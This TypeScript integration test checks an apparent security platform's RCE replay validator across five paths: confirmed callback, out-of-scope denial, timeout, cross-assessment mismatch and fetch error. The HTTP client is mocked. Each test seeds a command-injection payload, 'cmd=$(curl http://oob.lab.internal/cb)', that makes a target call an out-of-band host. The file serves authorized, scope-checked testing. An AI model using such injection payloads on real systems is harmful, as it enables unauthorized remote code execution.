// Sprint 20 §A-20-IT — full RCE replay pipeline integration test.
//
// 5 paths:
//   1. Happy path — confirmed: OOB callback match → findings row (severity=critical) + confirmed audit
//      + outbound URL contains OOB token (S18 HIGH-2 regression assert)
//   2. Deny path — out-of-scope: replay_denied audit, rceHttpClient.callCount===0, no findings
//   3. Unmatched path — OOB timeout: unmatched audit, no findings
//   4. Cross-assessment binding (S18/S19 HIGH-1 regression): candidate from assessment A,
//      envelope for assessment B → ack + assessment_mismatch audit, no httpClient call, no finding
//   5. Fetch error (S19 MED regression): httpClient.get throws → fetch_failed audit + terminal ack

import { afterAll, beforeAll, beforeEach, describe, expect, test } from 'bun:test';
import type { JobEnvelope } from '@cyberstrike/queue';
import {
  DEFAULT_PLATFORM_POLICY,
  type ToolPolicy,
  buildEffectiveScope,
} from '@cyberstrike/scope-engine';
import { type ValidatorWorkerDeps, handleRceReplay } from '@cyberstrike/validator-worker';
import { hasDatabaseUrl, resetAuthState } from '../auth/helpers/auth-fixture.ts';
import {
  type DbFixture,
  applyAllMigrations,
  createFixture,
  dropAllTables,
  seedAssessment,
  seedProject,
  seedTarget,
} from '../db/helpers/db-fixture.ts';
import {
  buildAssessmentLoader,
  buildAuditEmitter,
  buildCandidateLoader,
  buildFindingByCandidateLoader,
  buildFindingsWriter,
  buildLocalStorage,
  seedCandidateFinding,
  stubValidatorScopeDeps,
  uniqUuid,
} from './helpers.ts';

const VALID_TRACE = '0123456789abcdef0123456789abcdef';

// Mock RCE HTTP client — void return (RCE doesn't read response body).
class RceMockHttpClient {
  callCount = 0;
  readonly calledUrls: string[] = [];
  private readonly _shouldThrow?: Error;

  constructor(opts?: { shouldThrow?: Error }) {
    this._shouldThrow = opts?.shouldThrow;
  }

  async get(url: string): Promise<void> {
    this.callCount++;
    this.calledUrls.push(url);
    if (this._shouldThrow) throw this._shouldThrow;
  }
}

describe.skipIf(!hasDatabaseUrl())('validator :: RCE pipeline (A-20-IT)', () => {
  let fx: DbFixture;
  let tenantId: string;

  beforeAll(async () => {
    fx = await createFixture();
    await dropAllTables(fx);
    await applyAllMigrations(fx);
  });

  afterAll(async () => {
    await resetAuthState(fx.db);
    await dropAllTables(fx);
    await fx.db.destroy();
  });

  beforeEach(async () => {
    await resetAuthState(fx.db);
    tenantId = uniqUuid();
    await fx.db
      .insertInto('tenants')
      .values({ id: tenantId, slug: `t-${tenantId.slice(0, 8)}`, name: 't' })
      .execute();
  });

  // ─────────────────────────────────────────────────────────────────────────
  // Path 1 — happy path: OOB confirmed → findings row (critical) + audit
  //           + assert outbound URL contains OOB token (S18 HIGH-2 regression)
  // ─────────────────────────────────────────────────────────────────────────
  test('happy path — RCE confirmed: OOB match → findings row severity=critical + confirmed audit + outbound URL contains token', async () => {
    const userId = uniqUuid();
    await fx.db
      .insertInto('users')
      .values({
        id: userId,
        tenant_id: tenantId,
        email: `u-rce-${userId.slice(0, 8)}@example.com`,
        display_name: `u-rce-${userId.slice(0, 8)}`,
        status: 'active',
        role: 'security_lead',
        password_hash: 'x',
      })
      .execute();

    const projectId = await seedProject(fx, { tenantId, name: 'P-rce' });
    const targetId = await seedTarget(fx, {
      tenantId,
      projectId,
      kind: 'url',
      value: 'http://rce.lab.local/',
      ownershipStatus: 'verified',
    });
    const assessmentId = await seedAssessment(fx, {
      tenantId,
      projectId,
      createdBy: userId,
      state: 'running',
      targetIds: [targetId],
    });
    const rawAffectedUrl = 'http://rce.lab.local/api?cmd=$(curl http://oob.lab.internal/cb)';
    const candidateFindingId = await seedCandidateFinding(fx.db, {
      tenantId,
      assessmentId,
      type: 'rce',
      affectedUrl: rawAffectedUrl,
    });

    // Coordinator embeds OOB token via _cs_token= (mirror S18 HIGH-2 fix).
    const rceToken = `${candidateFindingId}.${tenantId}.abcd1234`;
    const rceReplayUrl = `${rawAffectedUrl}&_cs_token=${rceToken}`;

    const httpClient = new RceMockHttpClient();

    const rceScopeDeps = {
      ...stubValidatorScopeDeps,
      dns: {
        resolveA: async (host: string): Promise<string[]> => {
          if (host === 'rce.lab.local') return ['203.0.113.30'];
          return stubValidatorScopeDeps.dns.resolveA(host);
        },
        resolveAAAA: async (): Promise<string[]> => [],
      },
    };

    const scope = buildEffectiveScope({
      tenantId,
      assessmentId,
      tenantPolicy: { tenantId },
      platformPolicy: DEFAULT_PLATFORM_POLICY,
      rawRules: [
        {
          id: 'r1',
          ruleKind: 'domain',
          effect: 'allow',
          payload: { pattern: 'rce.lab.local', matchSubdomains: false },
        },
        { id: 'r2', ruleKind: 'protocol', effect: 'allow', payload: { protocol: 'http' } },
        { id: 'r3', ruleKind: 'port', effect: 'allow', payload: { port: 80 } },
        { id: 'r4', ruleKind: 'http_method', effect: 'allow', payload: { method: 'GET' } },
        { id: 'r5', ruleKind: 'path_pattern', effect: 'allow', payload: { glob: '/**' } },
        { id: 'r6', ruleKind: 'ip', effect: 'allow', payload: { ip: '203.0.113.30' } },
      ],
      toolCatalog: new Map<string, ToolPolicy>(),
      assessmentFlags: {
        highImpactCategories: [],
        ownershipVerifiedTargetIds: new Set([targetId]),
      },
      timeWindow: null,
    });

    const { storage } = buildLocalStorage();

    const deps: ValidatorWorkerDeps = {
      driver: { replay: async () => ({}) } as unknown as ValidatorWorkerDeps['driver'],
      objectStorage: storage,
      buildScope: async () => scope,
      scopeDeps: rceScopeDeps,
      auditEmitter: buildAuditEmitter(fx.db),
      candidateLoader: buildCandidateLoader(fx.db),
      assessmentLoader: buildAssessmentLoader(fx.db),
      findingsWriter: buildFindingsWriter(fx.db),
      findingEvidenceWriter: async () => ({ id: uniqUuid() }),
      findingByCandidateLoader: buildFindingByCandidateLoader(fx.db),
      evidenceCounter: async () => 0,
      findingCreatedAuditChecker: async () => false,
      payloadSchema: (await import('@cyberstrike/validator-worker')).validateFindingPayloadSchema,
      rceHttpClient: httpClient,
      oobCallbackLoader: async (_token: string) => true, // immediate match
      oobVerifyTimeoutMs: 1000,
    };

    const envelope: JobEnvelope = {
      jobId: uniqUuid(),
      tenantId,
      projectId,
      assessmentId,
      kind: 'validator.rce.replay',
      idempotencyKey: `rce:${candidateFindingId}`,
      createdAt: new Date().toISOString(),
      attempt: 0,
      maxAttempts: 3,
      traceId: VALID_TRACE,
      payload: {
        tenantId,
        projectId,
        assessmentId,
        candidateFindingId,
        candidateType: 'rce',
        affectedUrl: rceReplayUrl,
        token: rceToken,
        traceId: VALID_TRACE,
      },
    };

    const result = await handleRceReplay(deps, envelope);
    expect(result.kind).toBe('ack');
    expect(httpClient.callCount).toBe(1);

    // S18 HIGH-2 regression: outbound URL must contain the OOB token.
    expect(httpClient.calledUrls[0]).toContain(rceToken);

    // findings row created with type='rce', severity='critical'.
    const findings = await fx.db
      .selectFrom('findings')
      .selectAll()
      .where('tenant_id', '=', tenantId)
      .where('assessment_id', '=', assessmentId)
      .execute();
    expect(findings.length).toBe(1);
    expect(String(findings[0]?.type)).toBe('rce');
    expect(String(findings[0]?.severity)).toBe('critical');

    // validator.rce.confirmed audit present with outcome='success'.
    const confirmedAudits = await fx.db
      .selectFrom('audit_events')
      .selectAll()
      .where('tenant_id', '=', tenantId)
      .where('action', '=', 'validator.rce.confirmed')
      .execute();
    expect(confirmedAudits.length).toBeGreaterThanOrEqual(1);
    expect(String(confirmedAudits[0]?.after_state?.outcome)).toBe('success');
  });

  // ─────────────────────────────────────────────────────────────────────────
  // Path 2 — deny path: replay_denied audit, callCount===0, no findings
  // ─────────────────────────────────────────────────────────────────────────
  test('deny path — out-of-scope: replay_denied audit, callCount===0, no findings', async () => {
    const userId = uniqUuid();
    await fx.db
      .insertInto('users')
      .values({
        id: userId,
        tenant_id: tenantId,
        email: `u-rce-deny-${userId.slice(0, 8)}@example.com`,
        display_name: `u-rce-deny-${userId.slice(0, 8)}`,
        status: 'active',
        role: 'security_lead',
        password_hash: 'x',
      })
      .execute();

    const projectId = await seedProject(fx, { tenantId, name: 'P-rce-deny' });
    const targetId = await seedTarget(fx, {
      tenantId,
      projectId,
      kind: 'url',
      value: 'http://rce.denied.example/',
      ownershipStatus: 'verified',
    });
    const assessmentId = await seedAssessment(fx, {
      tenantId,
      projectId,
      createdBy: userId,
      state: 'running',
      targetIds: [targetId],
    });
    const rawUrl = 'http://rce.denied.example/api?cmd=$(curl http://oob.lab.internal/cb)';
    const candidateFindingId = await seedCandidateFinding(fx.db, {
      tenantId,
      assessmentId,
      type: 'rce',
      affectedUrl: rawUrl,
    });

    const rceToken = `${candidateFindingId}.${tenantId}.deadbeef`;
    const rceReplayUrl = `${rawUrl}&_cs_token=${rceToken}`;

    // Empty rules = deny by default.
    const scope = buildEffectiveScope({
      tenantId,
      assessmentId,
      tenantPolicy: { tenantId },
      platformPolicy: DEFAULT_PLATFORM_POLICY,
      rawRules: [],
      toolCatalog: new Map<string, ToolPolicy>(),
      assessmentFlags: {
        highImpactCategories: [],
        ownershipVerifiedTargetIds: new Set([targetId]),
      },
      timeWindow: null,
    });

    const httpClient = new RceMockHttpClient();
    const { storage } = buildLocalStorage();

    const deps: ValidatorWorkerDeps = {
      driver: { replay: async () => ({}) } as unknown as ValidatorWorkerDeps['driver'],
      objectStorage: storage,
      buildScope: async () => scope,
      scopeDeps: stubValidatorScopeDeps,
      auditEmitter: buildAuditEmitter(fx.db),
      candidateLoader: buildCandidateLoader(fx.db),
      assessmentLoader: buildAssessmentLoader(fx.db),
      findingsWriter: buildFindingsWriter(fx.db),
      findingEvidenceWriter: async () => ({ id: uniqUuid() }),
      findingByCandidateLoader: buildFindingByCandidateLoader(fx.db),
      evidenceCounter: async () => 0,
      findingCreatedAuditChecker: async () => false,
      payloadSchema: (await import('@cyberstrike/validator-worker')).validateFindingPayloadSchema,
      rceHttpClient: httpClient,
      oobCallbackLoader: async () => false,
    };

    const envelope: JobEnvelope = {
      jobId: uniqUuid(),
      tenantId,
      projectId,
      assessmentId,
      kind: 'validator.rce.replay',
      idempotencyKey: `rce-deny:${candidateFindingId}`,
      createdAt: new Date().toISOString(),
      attempt: 0,
      maxAttempts: 3,
      traceId: VALID_TRACE,
      payload: {
        tenantId,
        projectId,
        assessmentId,
        candidateFindingId,
        candidateType: 'rce',
        affectedUrl: rceReplayUrl,
        token: rceToken,
        traceId: VALID_TRACE,
      },
    };

    const result = await handleRceReplay(deps, envelope);
    expect(result.kind).toBe('ack');
    expect(httpClient.callCount).toBe(0);

    const findings = await fx.db
      .selectFrom('findings')
      .selectAll()
      .where('tenant_id', '=', tenantId)
      .where('assessment_id', '=', assessmentId)
      .execute();
    expect(findings.length).toBe(0);

    const deniedAudits = await fx.db
      .selectFrom('audit_events')
      .selectAll()
      .where('tenant_id', '=', tenantId)
      .where('action', '=', 'validator.rce.replay_denied')
      .execute();
    expect(deniedAudits.length).toBeGreaterThanOrEqual(1);
    expect(String(deniedAudits[0]?.after_state?.outcome)).toBe('denied');
  });

  // ─────────────────────────────────────────────────────────────────────────
  // Path 3 — unmatched: OOB timeout → unmatched audit, no findings
  // ─────────────────────────────────────────────────────────────────────────
  test('unmatched path — no OOB callback in window: unmatched audit, no findings', async () => {
    const userId = uniqUuid();
    await fx.db
      .insertInto('users')
      .values({
        id: userId,
        tenant_id: tenantId,
        email: `u-rce-unmatch-${userId.slice(0, 8)}@example.com`,
        display_name: `u-rce-unmatch-${userId.slice(0, 8)}`,
        status: 'active',
        role: 'security_lead',
        password_hash: 'x',
      })
      .execute();

    const projectId = await seedProject(fx, { tenantId, name: 'P-rce-unmatch' });
    const targetId = await seedTarget(fx, {
      tenantId,
      projectId,
      kind: 'url',
      value: 'http://rce.unmatch.local/',
      ownershipStatus: 'verified',
    });
    const assessmentId = await seedAssessment(fx, {
      tenantId,
      projectId,
      createdBy: userId,
      state: 'running',
      targetIds: [targetId],
    });
    const rawUrl = 'http://rce.unmatch.local/api?cmd=$(curl http://oob.lab.internal/cb)';
    const candidateFindingId = await seedCandidateFinding(fx.db, {
      tenantId,
      assessmentId,
      type: 'rce',
      affectedUrl: rawUrl,
    });

    const rceToken = `${candidateFindingId}.${tenantId}.cafebabe`;
    const rceReplayUrl = `${rawUrl}&_cs_token=${rceToken}`;

    const rceScopeDeps = {
      ...stubValidatorScopeDeps,
      dns: {
        resolveA: async (host: string): Promise<string[]> => {
          if (host === 'rce.unmatch.local') return ['203.0.113.31'];
          return stubValidatorScopeDeps.dns.resolveA(host);
        },
        resolveAAAA: async (): Promise<string[]> => [],
      },
    };

    const scope = buildEffectiveScope({
      tenantId,
      assessmentId,
      tenantPolicy: { tenantId },
      platformPolicy: DEFAULT_PLATFORM_POLICY,
      rawRules: [
        {
          id: 'r1',
          ruleKind: 'domain',
          effect: 'allow',
          payload: { pattern: 'rce.unmatch.local', matchSubdomains: false },
        },
        { id: 'r2', ruleKind: 'protocol', effect: 'allow', payload: { protocol: 'http' } },
        { id: 'r3', ruleKind: 'port', effect: 'allow', payload: { port: 80 } },
        { id: 'r4', ruleKind: 'http_method', effect: 'allow', payload: { method: 'GET' } },
        { id: 'r5', ruleKind: 'path_pattern', effect: 'allow', payload: { glob: '/**' } },
        { id: 'r6', ruleKind: 'ip', effect: 'allow', payload: { ip: '203.0.113.31' } },
      ],
      toolCatalog: new Map<string, ToolPolicy>(),
      assessmentFlags: {
        highImpactCategories: [],
        ownershipVerifiedTargetIds: new Set([targetId]),
      },
      timeWindow: null,
    });

    const httpClient = new RceMockHttpClient();
    const { storage } = buildLocalStorage();

    const deps: ValidatorWorkerDeps = {
      driver: { replay: async () => ({}) } as unknown as ValidatorWorkerDeps['driver'],
      objectStorage: storage,
      buildScope: async () => scope,
      scopeDeps: rceScopeDeps,
      auditEmitter: buildAuditEmitter(fx.db),
      candidateLoader: buildCandidateLoader(fx.db),
      assessmentLoader: buildAssessmentLoader(fx.db),
      findingsWriter: buildFindingsWriter(fx.db),
      findingEvidenceWriter: async () => ({ id: uniqUuid() }),
      findingByCandidateLoader: buildFindingByCandidateLoader(fx.db),
      evidenceCounter: async () => 0,
      findingCreatedAuditChecker: async () => false,
      payloadSchema: (await import('@cyberstrike/validator-worker')).validateFindingPayloadSchema,
      rceHttpClient: httpClient,
      oobCallbackLoader: async () => false, // never fires
      oobVerifyTimeoutMs: 50, // tiny timeout so test is fast
    };

    const envelope: JobEnvelope = {
      jobId: uniqUuid(),
      tenantId,
      projectId,
      assessmentId,
      kind: 'validator.rce.replay',
      idempotencyKey: `rce-unmatch:${candidateFindingId}`,
      createdAt: new Date().toISOString(),
      attempt: 0,
      maxAttempts: 3,
      traceId: VALID_TRACE,
      payload: {
        tenantId,
        projectId,
        assessmentId,
        candidateFindingId,
        candidateType: 'rce',
        affectedUrl: rceReplayUrl,
        token: rceToken,
        traceId: VALID_TRACE,
      },
    };

    const result = await handleRceReplay(deps, envelope);
    expect(result.kind).toBe('ack');
    expect(httpClient.callCount).toBe(1);

    const findings = await fx.db
      .selectFrom('findings')
      .selectAll()
      .where('tenant_id', '=', tenantId)
      .where('assessment_id', '=', assessmentId)
      .execute();
    expect(findings.length).toBe(0);

    const unmatchedAudits = await fx.db
      .selectFrom('audit_events')
      .selectAll()
      .where('tenant_id', '=', tenantId)
      .where('action', '=', 'validator.rce.unmatched')
      .execute();
    expect(unmatchedAudits.length).toBeGreaterThanOrEqual(1);
    expect(String(unmatchedAudits[0]?.after_state?.outcome)).toBe('success');
    expect(String(unmatchedAudits[0]?.resource_type)).toBe('candidate_finding');
  });

  // ─────────────────────────────────────────────────────────────────────────
  // Path 4 — cross-assessment binding (S18/S19 HIGH-1 regression)
  // ─────────────────────────────────────────────────────────────────────────
  test('cross-assessment: candidate from assessment A, envelope for assessment B → ack + assessment_mismatch audit, no httpClient call, no finding', async () => {
    const userId = uniqUuid();
    await fx.db
      .insertInto('users')
      .values({
        id: userId,
        tenant_id: tenantId,
        email: `u-rce-xassess-${userId.slice(0, 8)}@example.com`,
        display_name: `u-rce-xassess-${userId.slice(0, 8)}`,
        status: 'active',
        role: 'security_lead',
        password_hash: 'x',
      })
      .execute();

    const projectId = await seedProject(fx, { tenantId, name: 'P-rce-xassess' });
    const targetId = await seedTarget(fx, {
      tenantId,
      projectId,
      kind: 'url',
      value: 'http://rce.xassess.local/',
      ownershipStatus: 'verified',
    });

    // Assessment A — candidate seeded here.
    const assessmentIdA = await seedAssessment(fx, {
      tenantId,
      projectId,
      createdBy: userId,
      state: 'running',
      targetIds: [targetId],
    });
    // Assessment B — envelope references this.
    const assessmentIdB = await seedAssessment(fx, {
      tenantId,
      projectId,
      createdBy: userId,
      state: 'running',
      targetIds: [targetId],
    });

    const rawUrl = 'http://rce.xassess.local/api?cmd=$(curl http://oob.lab.internal/cb)';
    const candidateFindingId = await seedCandidateFinding(fx.db, {
      tenantId,
      assessmentId: assessmentIdA,
      type: 'rce',
      affectedUrl: rawUrl,
    });

    const rceToken = `${candidateFindingId}.${tenantId}.f00dcafe`;
    const rceReplayUrl = `${rawUrl}&_cs_token=${rceToken}`;

    const httpClient = new RceMockHttpClient();
    const { storage } = buildLocalStorage();

    const deps: ValidatorWorkerDeps = {
      driver: { replay: async () => ({}) } as unknown as ValidatorWorkerDeps['driver'],
      objectStorage: storage,
      buildScope: async () => null,
      scopeDeps: stubValidatorScopeDeps,
      auditEmitter: buildAuditEmitter(fx.db),
      candidateLoader: buildCandidateLoader(fx.db),
      assessmentLoader: buildAssessmentLoader(fx.db),
      findingsWriter: buildFindingsWriter(fx.db),
      findingEvidenceWriter: async () => ({ id: uniqUuid() }),
      findingByCandidateLoader: buildFindingByCandidateLoader(fx.db),
      evidenceCounter: async () => 0,
      findingCreatedAuditChecker: async () => false,
      payloadSchema: (await import('@cyberstrike/validator-worker')).validateFindingPayloadSchema,
      rceHttpClient: httpClient,
      oobCallbackLoader: async () => true,
      oobVerifyTimeoutMs: 1000,
    };

    // Envelope references assessment B but candidate belongs to assessment A.
    const envelope: JobEnvelope = {
      jobId: uniqUuid(),
      tenantId,
      projectId,
      assessmentId: assessmentIdB,
      kind: 'validator.rce.replay',
      idempotencyKey: `rce-xassess:${candidateFindingId}`,
      createdAt: new Date().toISOString(),
      attempt: 0,
      maxAttempts: 3,
      traceId: VALID_TRACE,
      payload: {
        tenantId,
        projectId,
        assessmentId: assessmentIdB, // mismatched
        candidateFindingId,
        candidateType: 'rce',
        affectedUrl: rceReplayUrl,
        token: rceToken,
        traceId: VALID_TRACE,
      },
    };

    const result = await handleRceReplay(deps, envelope);

    // Terminal ack — not a nack.
    expect(result.kind).toBe('ack');

    // No HTTP call made (S18 HIGH-1 regression: no httpClient call on cross-asmt).
    expect(httpClient.callCount).toBe(0);

    // No finding inserted into either assessment.
    const findings = await fx.db
      .selectFrom('findings')
      .selectAll()
      .where('tenant_id', '=', tenantId)
      .execute();
    expect(findings.length).toBe(0);

    // assessment_mismatch denial audit emitted.
    const deniedAudits = await fx.db
      .selectFrom('audit_events')
      .selectAll()
      .where('tenant_id', '=', tenantId)
      .where('action', '=', 'validator.rce.replay_denied')
      .execute();
    expect(deniedAudits.length).toBeGreaterThanOrEqual(1);
    const deniedAfter = deniedAudits[0]?.after_state as Record<string, unknown> | null;
    expect(deniedAfter?.reason).toBe('assessment_mismatch');
  });

  // ─────────────────────────────────────────────────────────────────────────
  // Path 5 — fetch error (S19 MED regression): fetch_failed audit + terminal ack
  // ─────────────────────────────────────────────────────────────────────────
  test('fetch error — httpClient.get throws: fetch_failed audit + terminal ack (S19 MED regression)', async () => {
    const userId = uniqUuid();
    await fx.db
      .insertInto('users')
      .values({
        id: userId,
        tenant_id: tenantId,
        email: `u-rce-fetcherr-${userId.slice(0, 8)}@example.com`,
        display_name: `u-rce-fetcherr-${userId.slice(0, 8)}`,
        status: 'active',
        role: 'security_lead',
        password_hash: 'x',
      })
      .execute();

    const projectId = await seedProject(fx, { tenantId, name: 'P-rce-fetcherr' });
    const targetId = await seedTarget(fx, {
      tenantId,
      projectId,
      kind: 'url',
      value: 'http://rce.fetcherr.local/',
      ownershipStatus: 'verified',
    });
    const assessmentId = await seedAssessment(fx, {
      tenantId,
      projectId,
      createdBy: userId,
      state: 'running',
      targetIds: [targetId],
    });
    const rawUrl = 'http://rce.fetcherr.local/api?cmd=$(curl http://oob.lab.internal/cb)';
    const candidateFindingId = await seedCandidateFinding(fx.db, {
      tenantId,
      assessmentId,
      type: 'rce',
      affectedUrl: rawUrl,
    });

    const rceToken = `${candidateFindingId}.${tenantId}.baadf00d`;
    const rceReplayUrl = `${rawUrl}&_cs_token=${rceToken}`;

    const rceScopeDeps = {
      ...stubValidatorScopeDeps,
      dns: {
        resolveA: async (host: string): Promise<string[]> => {
          if (host === 'rce.fetcherr.local') return ['203.0.113.32'];
          return stubValidatorScopeDeps.dns.resolveA(host);
        },
        resolveAAAA: async (): Promise<string[]> => [],
      },
    };

    const scope = buildEffectiveScope({
      tenantId,
      assessmentId,
      tenantPolicy: { tenantId },
      platformPolicy: DEFAULT_PLATFORM_POLICY,
      rawRules: [
        {
          id: 'r1',
          ruleKind: 'domain',
          effect: 'allow',
          payload: { pattern: 'rce.fetcherr.local', matchSubdomains: false },
        },
        { id: 'r2', ruleKind: 'protocol', effect: 'allow', payload: { protocol: 'http' } },
        { id: 'r3', ruleKind: 'port', effect: 'allow', payload: { port: 80 } },
        { id: 'r4', ruleKind: 'http_method', effect: 'allow', payload: { method: 'GET' } },
        { id: 'r5', ruleKind: 'path_pattern', effect: 'allow', payload: { glob: '/**' } },
        { id: 'r6', ruleKind: 'ip', effect: 'allow', payload: { ip: '203.0.113.32' } },
      ],
      toolCatalog: new Map<string, ToolPolicy>(),
      assessmentFlags: {
        highImpactCategories: [],
        ownershipVerifiedTargetIds: new Set([targetId]),
      },
      timeWindow: null,
    });

    // httpClient throws — simulating network error.
    const httpClient = new RceMockHttpClient({ shouldThrow: new Error('ECONNREFUSED') });
    const { storage } = buildLocalStorage();

    const deps: ValidatorWorkerDeps = {
      driver: { replay: async () => ({}) } as unknown as ValidatorWorkerDeps['driver'],
      objectStorage: storage,
      buildScope: async () => scope,
      scopeDeps: rceScopeDeps,
      auditEmitter: buildAuditEmitter(fx.db),
      candidateLoader: buildCandidateLoader(fx.db),
      assessmentLoader: buildAssessmentLoader(fx.db),
      findingsWriter: buildFindingsWriter(fx.db),
      findingEvidenceWriter: async () => ({ id: uniqUuid() }),
      findingByCandidateLoader: buildFindingByCandidateLoader(fx.db),
      evidenceCounter: async () => 0,
      findingCreatedAuditChecker: async () => false,
      payloadSchema: (await import('@cyberstrike/validator-worker')).validateFindingPayloadSchema,
      rceHttpClient: httpClient,
      oobCallbackLoader: async () => false,
      oobVerifyTimeoutMs: 1000,
    };

    const envelope: JobEnvelope = {
      jobId: uniqUuid(),
      tenantId,
      projectId,
      assessmentId,
      kind: 'validator.rce.replay',
      idempotencyKey: `rce-fetcherr:${candidateFindingId}`,
      createdAt: new Date().toISOString(),
      attempt: 0,
      maxAttempts: 3,
      traceId: VALID_TRACE,
      payload: {
        tenantId,
        projectId,
        assessmentId,
        candidateFindingId,
        candidateType: 'rce',
        affectedUrl: rceReplayUrl,
        token: rceToken,
        traceId: VALID_TRACE,
      },
    };

    const result = await handleRceReplay(deps, envelope);

    // Terminal ack — not a nack (S19 MED-1: fetch error is terminal, not retried).
    expect(result.kind).toBe('ack');

    // validator.rce.fetch_failed audit emitted.
    const fetchFailedAudits = await fx.db
      .selectFrom('audit_events')
      .selectAll()
      .where('tenant_id', '=', tenantId)
      .where('action', '=', 'validator.rce.fetch_failed')
      .execute();
    expect(fetchFailedAudits.length).toBeGreaterThanOrEqual(1);
    expect(String(fetchFailedAudits[0]?.after_state?.outcome)).toBe('denied');

    // No finding inserted.
    const findings = await fx.db
      .selectFrom('findings')
      .selectAll()
      .where('tenant_id', '=', tenantId)
      .where('assessment_id', '=', assessmentId)
      .execute();
    expect(findings.length).toBe(0);
  });
});
